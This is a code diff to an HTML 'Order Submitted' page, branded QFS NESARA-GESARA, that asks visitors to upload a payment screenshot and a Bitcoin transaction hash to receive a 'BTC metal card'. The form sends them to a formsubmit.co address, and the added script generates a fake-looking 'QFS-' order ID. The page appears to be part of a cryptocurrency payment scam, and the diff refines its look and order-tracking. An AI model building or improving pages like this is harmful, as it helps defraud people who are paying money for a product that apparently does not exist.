@@ -32,7 +32,6 @@
     overflow-x: hidden;
   }
 
-  /* Floating Glass Panel */
   .container {
     width: 90%;
     max-width: 520px;
@@ -48,6 +47,7 @@
     animation: floatUp 1.2s ease forwards;
     transform: translateY(22px);
     opacity: 0;
+    text-align:center;
   }
 
   @keyframes floatUp {
@@ -57,7 +57,6 @@
     }
   }
 
-  /* Logo */
   .logo {
     width: 160px;
     display: block;
@@ -65,7 +64,6 @@
     filter: drop-shadow(0 8px 14px rgba(56,189,248,0.25));
   }
 
-  /* Heading */
   h1 {
     font-size: 32px;
     margin-bottom: 8px;
@@ -82,11 +80,8 @@
     margin-bottom: 12px;
   }
 
-  strong {
-    color: var(--accent);
-  }
+  strong { color: var(--accent); }
 
-  /* Form Fields */
   form {
     margin-top: 22px;
     text-align: left;
@@ -124,7 +119,6 @@
     background: rgba(255,255,255,0.12);
   }
 
-  /* Submit Button */
   .btn {
     width: 100%;
     margin-top: 30px;
@@ -150,18 +144,15 @@
       0 0 0 1px rgba(255,255,255,0.18);
   }
 
-  /* Response Animations */
-  @keyframes glowPulse {
-    0% { box-shadow: 0 0 0px rgba(56,189,248,0.5); }
-    50% { box-shadow: 0 0 18px rgba(56,189,248,1); }
-    100% { box-shadow: 0 0 0px rgba(56,189,248,0.5); }
+  .order-note {
+    margin-top:10px;
+    font-size:13px;
+    color:var(--muted);
   }
-
 </style>
 </head>
 
 <body>
-
 <div class="container">
 
     <img class="logo"
@@ -171,18 +162,26 @@
     <h1>Order Submitted</h1>
     <p><strong>Payment Confirmation Required</strong></p>
     <p>Upload your payment screenshot and TXID so we can verify your payment and ship your metal card.</p>
+    <p class="order-note">A unique Order ID will be generated and shown on the next screen.</p>
 
-    <form action="https://formsubmit.co/support@qfsnesaragesara.org" method="POST" enctype="multipart/form-data">
+    <form id="confirmForm"
+          action="https://formsubmit.co/support@qfsnesaragesara.org"
+          method="POST"
+          enctype="multipart/form-data">
 
-        <!-- After Submit Redirect -->
+        <!-- Redirect After Submit (will be overridden by JS to add ?order=ID) -->
         <input type="hidden" name="_next"
+               id="nextUrl"
                value="https://qfsnesaragesara.github.io/BTC-METAL-CARD-PAYMENT/success-payment.html">
 
-        <!-- Honeypot -->
+        <!-- Honeypot Anti-Spam -->
         <input type="text" name="_honey" style="display:none">
 
-        <!-- Spam Filter -->
+        <!-- FormSubmit Anti-Spam -->
         <input type="hidden" name="_spam" value="true">
+
+        <!-- Order ID (hidden, will be filled by JS) -->
+        <input type="hidden" name="Order ID" id="orderIdHidden" value="">
 
         <label>Transaction Hash (TXID)</label>
         <input type="text" name="Transaction Hash" placeholder="Enter your TXID" required>
@@ -197,6 +196,30 @@
     </form>
 
 </div>
+
+<script>
+function generateOrderId() {
+  const prefix = "QFS-";
+  const chars = "ABCDEF0123456789";
+  let suffix = "";
+  for (let i = 0; i < 7; i++) {
+    suffix += chars[Math.floor(Math.random() * chars.length)];
+  }
+  return prefix + suffix;
+}
+
+(function initOrderId() {
+  const orderId = generateOrderId();
+  const hiddenField = document.getElementById("orderIdHidden");
+  const nextField   = document.getElementById("nextUrl");
+
+  hiddenField.value = orderId;
+  localStorage.setItem("qfsOrderId", orderId);
+
+  const baseNext = "https://qfsnesaragesara.github.io/BTC-METAL-CARD-PAYMENT/success-payment.html";
+  nextField.value = baseNext + "?order=" + encodeURIComponent(orderId);
+})();
+</script>
 
 </body>
 </html>
